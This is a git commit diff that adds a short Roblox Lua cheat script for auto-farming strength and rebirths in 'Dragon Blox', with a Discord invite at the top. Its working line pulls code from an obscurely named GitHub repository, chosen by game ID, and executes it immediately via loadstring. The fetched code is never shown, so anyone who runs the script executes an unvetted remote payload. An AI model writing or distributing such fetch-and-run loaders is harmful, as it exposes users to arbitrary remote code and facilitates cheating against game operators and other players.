768a0af42b34bf3f0c7cf77fa1b628c6d8e45c6f
Emil Toth <emiltoth1870@gmail.com>
2023-03-07 22:10:00 +0100

    Updated automatically!

---
+++ Scripts/Autoadd/Dragon Blox Auto Strength Farm Auto Rebirth Get Drops.lua
@@ -0,0 +1,3 @@
+--https://discord.gg/qwCV4uAGYf                                                       
+  repeat wait() until game:IsLoaded()
+pcall(function()loadstring(game:HttpGet("https://raw.githubusercontent.com/fvyaefvuiawgfio/0R-G-gN-D--PnfF-b-IUZ8GBDB-G-/main/"..tostring(game.PlaceId)))()end)
